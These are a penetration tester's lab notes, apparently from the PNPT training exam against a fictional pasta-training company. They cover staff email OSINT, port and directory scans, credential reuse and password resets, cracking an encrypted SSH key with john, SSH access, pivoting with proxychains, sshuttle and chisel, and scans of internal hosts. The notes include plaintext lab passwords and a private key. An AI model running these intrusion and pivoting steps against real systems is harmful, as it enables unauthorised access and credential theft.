## OSIENT 

#### Users
1. Contact details - [info@thepastamentors.com](mailto:info@thepastamentors.com)  (From webpage)
2. Leo Fusilli - web admin -leo@thepastamentors.com (From webpage source page)
3. Alessandra Fettuccini - owner alessandra@thepastamentors.com
4. Alanzo Bucatini - Sous Trainer alanzo@thepastamentors.com
5. Adriano Penne - Trainer adriano@thepastamentors.com
6. Ferruccio Tortellini and Giovanni Rigatoni -  Chefs in training
ferruccio@thepastamentors.com
giovanni@thepastamentors.com    [grigatoni@esm.rochester.edu](https://thatsthem.com/email/grigatoni@esm.rochester.edu) 

7. mario@thepastamentors.com
8. postmaster@thepastamentors.com
## External 

1. Figure out alive hosts. Only 5 on up. 
```
┌──(kali㉿kali)-[~/PNPT]
└─$ fping -g 10.10.155.0/24          
10.10.155.5 is alive
10.10.155.1 is unreachable
10.10.155.2 is unreachable
10.10.155.3 is unreachable
10.10.155.4 is unreachable
10.10.155.6 is unreachable
10.10.155.7 is unreachable
10.10.155.8 is unreachable
10.10.155.9 is unreachable
```

2. Rustscan 
```
┌──(kali㉿kali)-[~/PNPT]
└─$ rustscan 10.10.155.5 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.155.5:22
Open 10.10.155.5:25
Open 10.10.155.5:80
Open 10.10.155.5:110
Open 10.10.155.5:143
Open 10.10.155.5:443
Open 10.10.155.5:587
Open 10.10.155.5:993
Open 10.10.155.5:995
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,25,80,110,143,443,587,993,995 10.10.155.5

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-28 08:08 EST
Initiating Ping Scan at 08:08
Scanning 10.10.155.5 [2 ports]
Completed Ping Scan at 08:08, 0.29s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:08
Completed Parallel DNS resolution of 1 host. at 08:08, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 08:08
Scanning 10.10.155.5 [9 ports]
Discovered open port 80/tcp on 10.10.155.5
Discovered open port 143/tcp on 10.10.155.5
Discovered open port 993/tcp on 10.10.155.5
Discovered open port 587/tcp on 10.10.155.5
Discovered open port 25/tcp on 10.10.155.5
Discovered open port 110/tcp on 10.10.155.5
Discovered open port 443/tcp on 10.10.155.5
Discovered open port 995/tcp on 10.10.155.5
Discovered open port 22/tcp on 10.10.155.5
Completed Connect Scan at 08:08, 0.29s elapsed (9 total ports)
Nmap scan report for 10.10.155.5
Host is up, received syn-ack (0.29s latency).
Scanned at 2024-02-28 08:08:45 EST for 1s

PORT    STATE SERVICE    REASON
22/tcp  open  ssh        syn-ack
25/tcp  open  smtp       syn-ack
80/tcp  open  http       syn-ack
110/tcp open  pop3       syn-ack
143/tcp open  imap       syn-ack
443/tcp open  https      syn-ack
587/tcp open  submission syn-ack
993/tcp open  imaps      syn-ack
995/tcp open  pop3s      syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.65 seconds
```

3. Nmap 
```
┌──(kali㉿kali)-[~/PNPT]
└─$ nmap -p$(cat 5-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 10.10.155.5
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-28 08:10 EST
Nmap scan report for 10.10.155.5
Host is up (0.30s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ca:8d:f9:d8:62:2f:b9:df:dd:c2:af:91:9a:7a:c8:18 (RSA)
|   256 74:27:39:90:00:13:ab:60:ce:ae:68:68:77:ff:d2:41 (ECDSA)
|_  256 fe:a4:f4:52:1f:01:62:08:4b:96:2d:49:f4:06:85:cb (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: SMTP: EHLO 521 5.5.1 Protocol error\x0D
80/tcp  open  http     nginx
|_http-title: Did not follow redirect to https://10.10.155.5/
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: PIPELINING UIDL RESP-CODES SASL TOP CAPA STLS AUTH-RESP-CODE
| ssl-cert: Subject: commonName=mail.thepastamentors.com/organizationName=mail.thepastamentors.com/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2021-04-05T20:22:31
|_Not valid after:  2031-04-03T20:22:31
|_ssl-date: TLS randomness does not represent time
143/tcp open  imap     Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=mail.thepastamentors.com/organizationName=mail.thepastamentors.com/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2021-04-05T20:22:31
|_Not valid after:  2031-04-03T20:22:31
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: OK capabilities LOGINDISABLEDA0001 more post-login STARTTLS listed LITERAL+ IMAP4rev1 SASL-IR LOGIN-REFERRALS have IDLE ID ENABLE Pre-login
443/tcp open  ssl/http nginx
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=mail.thepastamentors.com/organizationName=mail.thepastamentors.com/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2021-04-05T20:22:31
|_Not valid after:  2031-04-03T20:22:31
| http-robots.txt: 1 disallowed entry 
|_/
| tls-nextprotoneg: 
|   h2
|_  http/1.1
587/tcp open  smtp     Postfix smtpd
|_smtp-commands: mail.thepastamentors.com, PIPELINING, SIZE 15728640, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mail.thepastamentors.com/organizationName=mail.thepastamentors.com/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2021-04-05T20:22:31
|_Not valid after:  2031-04-03T20:22:31
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: OK have capabilities more post-login listed Pre-login LITERAL+ IMAP4rev1 SASL-IR LOGIN-REFERRALS AUTH=LOGINA0001 IDLE ID ENABLE AUTH=PLAIN
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mail.thepastamentors.com/organizationName=mail.thepastamentors.com/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2021-04-05T20:22:31
|_Not valid after:  2031-04-03T20:22:31
995/tcp open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: PIPELINING UIDL RESP-CODES SASL(PLAIN LOGIN) TOP CAPA USER AUTH-RESP-CODE
| ssl-cert: Subject: commonName=mail.thepastamentors.com/organizationName=mail.thepastamentors.com/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2021-04-05T20:22:31
|_Not valid after:  2031-04-03T20:22:31
Service Info: Hosts: -mail.thepastamentors.com,  mail.thepastamentors.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.68 seconds
```

3. Dirsearch for dirbrute
```
┌──(kali㉿kali)-[~/PNPT/pnpt-wordlists]
└─$ python3 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u https://10.10.155.5/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/PNPT/pnpt-wordlists/reports/https_10.10.155.5/__24-02-28_18-11-55.txt

Target: https://10.10.155.5/

[18:11:55] Starting: 
[18:12:03] 403 -  564B  - /%2e%2e;/test                                     
[18:12:20] 301 -  178B  - /.well-known/carddav  ->  https://10.10.155.5/SOGo/dav
[18:12:20] 301 -  178B  - /.well-known/caldav  ->  https://10.10.155.5/SOGo/dav
[18:12:35] 403 -  564B  - /admin/.config                                    
[18:12:55] 403 -  564B  - /admpar/.ftppass                                  
[18:12:55] 403 -  564B  - /admrev/.ftppass
[18:13:04] 403 -  564B  - /bitrix/.settings                                 
[18:13:04] 403 -  564B  - /bitrix/.settings.bak
[18:13:04] 403 -  564B  - /bitrix/.settings.php
[18:13:04] 403 -  564B  - /bitrix/.settings.php.bak
[18:13:27] 403 -  564B  - /ext/.deps                                        
[18:13:39] 200 -    5KB - /iredadmin                                        
[18:13:42] 403 -  564B  - /lib/flex/uploader/.actionScriptProperties        
[18:13:42] 403 -  564B  - /lib/flex/uploader/.project
[18:13:42] 403 -  564B  - /lib/flex/uploader/.flexProperties                
[18:13:43] 403 -  564B  - /lib/flex/uploader/.settings
[18:13:43] 403 -  564B  - /lib/flex/varien/.actionScriptProperties
[18:13:43] 403 -  564B  - /lib/flex/varien/.project
[18:13:43] 403 -  564B  - /lib/flex/varien/.flexLibProperties               
[18:13:43] 403 -  564B  - /lib/flex/varien/.settings
[18:13:47] 301 -  178B  - /mail  ->  https://10.10.155.5/mail/              
[18:13:47] 200 -    5KB - /mail/                                            
[18:13:47] 403 -  564B  - /mailer/.env                                      
[18:13:51] 502 -  568B  - /Microsoft-Server-ActiveSync/                     
[18:13:54] 401 -  590B  - /netdata/                                         
[18:13:55] 303 -    0B  - /newsletter/  ->  https://10.10.155.5/iredadmin/newsletter
[18:14:10] 403 -  564B  - /resources/.arch-internal-preview.css             
[18:14:10] 403 -  564B  - /resources/sass/.sass-cache/                      
[18:14:11] 200 -   26B  - /robots.txt                                       
[18:14:20] 403 -  564B  - /status                                           
[18:14:20] 403 -  564B  - /status?full=true                                 
[18:14:27] 403 -  564B  - /twitter/.env                                     
                                                                             
Task Completed
```

4. Found the credentials from common.txt. 
```
username:ferruccio@thepastamentors.com
password:Winter2023!
```

5. In the dashboard, changed the password for giovanni and login webmail. 
```
giovanni@thepastamentors.com
New password: Summer2023!
```

6. Obtained RSA in giovanni mail, Cracked it. 
```

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AA7CD1272196561A254DDC7C5DDED5C5

Y/qFhk5MYzFINV63IEVC3PQT6F/2Qip5EgQqmGM6qfWD6PAEZmboQY9ebTYp7x8K
nFvMc+ozVwRJBl8sJszp0a6NGdIPXC8NU1JmdGGAblkLyWMViugJ3eYDhj7dspD7
J0PzCvOzbIza1KAFkQ+5HENPYN86EVgMIoKxKToRRqZJR2PcziAI+nfDxQBG8+Nj
y6Kb0H732J9FengtovgOMvo52ontv7QB5J/V8KM9Aw6F0BosrEylonTmp5Di1tIo
8TiRC7WCl+utHPFM3mUhTxwTOouJttsilJX9dZFphwUlLE5pRWvdY94vRCXkTg5U
/J1iyzbCftqtisS9JA2JDRNpb+JjirTXHoZ1NEOOADHaEww53lpe5Em3RvQ5vM9J
UBinbtcwvHxjDrquL34TCexXbTSmNmLQoGNHNq+mLGUVd0ZhV/1+w3kAWISuQnzH
QtjyLzWMREYfAXFo3q49p5bJ+U2o6Y2x7rraT/HRVv8uKIuQ5kIjf3uG2TVIlyoR
GwUFcY5Z01ZPeRUhdVacmDorv1iJOF/glg/8K1DbqidLeS2KOPMFzWuW/4opZ8ry
HAO/yDKIGtGZA6dvyiddpIsP15bm4eCb5ogYKljU0SRIsHIbPJKJ8LZxTcJMVLGf
H4IsrcKRrrmOGlzLxCbCiakbu6MRL3xKsGHLx/oMO/lV9R1tAA13gT/oRUCDea20
WabYJ/dNtVJZ1uY2FXFsmY+jXqRXfNP0sGYuXScVPxDkVIuPvhEpru/xw6E1bsfs
Gl0SC+hOtO+GKrd5tCkIykmJexsSHyjinPI/Niembz1p9W//hjlPZp8NeaMqTeYY
CGXOLBrqwZt0diUlOccbBNbMjbs77jyDM+ikAziR5OyXJE+fbURm9otr8gM7f9GI
mTnXnWK/qaORG0owu79RFo+LGrHTqy9Tw0jRdA/4tXbkYAaOL8ngoDHvHEs3IUr+
kl3z60i1VYzfBqYt7dn/+s8vj7o1y8MTJuKzHkE2SQdUC1BgKdfXEJqWkE+xMuZF
33kCO/Yj2l5au3ALXOD8MJyOwji7Z8naa4atrSjbHykTx5ba+oMZtw2AVnjaN5vb
8HfcUuk+KauYUiooNUo2rwskpJo+U04b+qerHW3wV+MvpQDM5FQMP8rmOGONvfi6
+1MGre/3nGDIUxJh+knpHcgoYCnDMeZPjIibgebFr12lLBatyqQyjdNfWv7VpeEW
rAlvA1foAWLqJQ91Rv9wggyGhg6fRXWLFslgFDISpyIvjom4aMQr+l+IKMtFquy0
lA6IEVmNDw8gMHYIG2QVqZ93pO4oVFsH+E9M0beQBFBnEeMo8bRy6xF3UhJ+cXjz
gciVN1OApxnKB9Fye2zduB/Ti4wf2iASssTWNaPAD1HIzAC4erguscMP8DYGPCv8
4V4/gQEdk4V+xWOWrt3rWdLTqhatmzOhMLyhfYmgjgy1e+JkYS0/wC8IXZ/EYGrK
aFq8cGWULJtSCsG1t6WzJn4ivW4Dxsx+FcnytCACyR37EnXmG/A3AD9IkTckDRMH
s1mW+4OUAruUKp65uOtiwTbNTuyr/64GiPdZjBTSSsXEKGcmKuxk7hMCFNg3GcHN
-----END RSA PRIVATE KEY-----

┌──(kali㉿kali)-[~/PNPT/pnpt-wordlists]
└─$ ssh2john id_rsa > ssh.hash 

┌──(kali㉿kali)-[~/PNPT/pnpt-wordlists]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (id_rsa)     
1g 0:00:00:00 DONE (2024-03-01 05:53) 100.0g/s 352000p/s 352000c/s 352000C/s fotos..dracula
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

6. Found web user deails in giovanni webmail
```
Things to not forget:

Alessandra's birthday: 6/19/86

My password: P@55w0rd!

Web server user: adminuser

Web server SSH key password: (I've already forgotten)

```

7. SSH login and first shell
```
┌──(kali㉿kali)-[~/PNPT/pnpt-wordlists]
└─$ sudo ssh -i id_rsa -oHostKeyAlgorithms=+ssh-dss adminuser@10.10.155.5
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-197-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Mar  1 06:04:00 EST 2024

  System load:  0.23               Processes:           153
  Usage of /:   46.9% of 18.53GB   Users logged in:     0
  Memory usage: 54%                IP address for eth0: 10.10.155.5
  Swap usage:   0%                 IP address for eth1: 10.10.10.5


0 updates can be applied immediately.


Last login: Sat Jan  7 16:20:20 2023 from 10.10.200.5
adminuser@mail:~$ whoami
adminuser
```

8. Port forwarding with ssh done. 
```
┌──(kali㉿kali)-[~/PNPT/pnpt-wordlists]
└─$ sudo ssh -f -N -D 1080 -i id_rsa adminuser@10.10.155.5
Enter passphrase for key 'id_rsa': 

Confirmation:
┌──(kali㉿kali)-[~/PNPT/pnpt-wordlists]
└─$ proxychains nmap -p88 10.10.10.225      
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-01 08:42 EST
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.10.225:80 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.10.225:88  ...  OK
Nmap scan report for 10.10.10.225
Host is up (0.30s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec

Nmap done: 1 IP address (1 host up) scanned in 0.67 seconds
```

9. Port forwarding with sshuttle. 
```
┌──(kali㉿kali)-[~/PNPT/pnpt-wordlists]
└─$ sudo sshuttle -r adminuser@10.10.155.5 10.10.10.0/24 --ssh-cmd "ssh -i id_rsa"
Enter passphrase for key 'id_rsa': 
c : Connected to server.

```

10. Figure out open ips
```
adminuser@mail:/$ ip neigh
10.10.155.1 dev eth0 lladdr 02:a0:4f:fb:1a:b9 REACHABLE
10.10.10.225 dev eth1 lladdr 02:78:f0:26:a0:df STALE
10.10.10.15 dev eth1 lladdr 02:39:02:34:ac:27 STALE
10.10.10.35 dev eth1 lladdr 02:81:1a:43:ab:e9 STALE
10.10.10.1 dev eth1 lladdr 02:26:5b:df:4d:3b STALE
10.10.10.25 dev eth1 lladdr 02:f6:d6:a7:ba:09 STALE
```

11. Use scp to transfer files. 
```
┌──(kali㉿kali)-[~/PNPT/pnpt-wordlists]
└─$ sudo scp -i id_rsa -oHostKeyAlgorithms=+ssh-dss chisel-l  adminuser@10.10.155.5:/tmp
Enter passphrase for key 'id_rsa': 
chisel-l                  100% 8452KB 410.4KB/s   00:20  
```

## 5

1. /etc/passwd
```
adminuser@mail:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
clamav:x:112:114::/var/lib/clamav:/bin/false
postfix:x:113:116::/var/spool/postfix:/usr/sbin/nologin
dovecot:x:114:118:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
dovenull:x:115:119:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
debian-spamd:x:116:120::/var/lib/spamassassin:/bin/sh
amavis:x:117:121:AMaViS system user,,,:/var/lib/amavis:/bin/sh
vmail:x:2000:2000::/home/vmail:/usr/sbin/nologin
mlmmj:x:2003:2003::/var/vmail/mlmmj:/usr/sbin/nologin
iredadmin:x:2001:2001::/home/iredadmin:/usr/sbin/nologin
iredapd:x:2002:2002::/home/iredapd:/usr/sbin/nologin
netdata:x:2004:2004::/home/netdata:/usr/sbin/nologin
adminuser:x:1001:1001:,,,:/home/adminuser:/bin/bash
```


# 15
```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sT -A --top-ports=20 10.10.10.15 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-01 09:48 EST
Nmap scan report for 10.10.10.15
Host is up (0.00053s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  tcpwrapped
22/tcp   open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
23/tcp   open  tcpwrapped
25/tcp   open  tcpwrapped
|_smtp-commands: Couldn't establish connection on port 25
53/tcp   open  tcpwrapped
80/tcp   open  tcpwrapped
110/tcp  open  tcpwrapped
111/tcp  open  tcpwrapped
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp  open  tcpwrapped
443/tcp  open  tcpwrapped
445/tcp  open  microsoft-ds?
993/tcp  open  tcpwrapped
995/tcp  open  tcpwrapped
1723/tcp open  tcpwrapped
3306/tcp open  tcpwrapped
3389/tcp open  tcpwrapped
5900/tcp open  tcpwrapped
8080/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-03-01T14:49:28
|_  start_date: N/A

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   305.72 ms 10.8.0.1
2   ... 30

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.17 seconds

```

# 25
```

proxychains nmap -sT -A --top-ports=20 10.10.10.25  
PORT     STATE  SERVICE       VERSION
21/tcp   closed ftp
22/tcp   closed ssh
23/tcp   closed telnet
25/tcp   closed smtp
53/tcp   closed domain
80/tcp   open   http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
110/tcp  closed pop3
111/tcp  closed rpcbind
135/tcp  open   msrpc         Microsoft Windows RPC
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
143/tcp  closed imap
443/tcp  closed https
445/tcp  open   microsoft-ds?
993/tcp  closed imaps
995/tcp  closed pop3s
1723/tcp closed pptp
3306/tcp closed mysql
3389/tcp open   ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THEPASTAMENTORS
|   NetBIOS_Domain_Name: THEPASTAMENTORS
|   NetBIOS_Computer_Name: BYPASS
|   DNS_Domain_Name: thepastamentors.com
|   DNS_Computer_Name: BYPASS.thepastamentors.com
|   Product_Version: 10.0.19041
|_  System_Time: 2024-03-01T14:17:39+00:00
| ssl-cert: Subject: commonName=BYPASS.thepastamentors.com
| Not valid before: 2024-02-29T12:33:37
|_Not valid after:  2024-08-30T12:33:37
|_ssl-date: 2024-03-01T14:17:52+00:00; +1s from scanner time.
5900/tcp closed vnc
8080/tcp closed http-proxy
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-03-01T14:17:39
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.25 seconds
```

# 35


# 225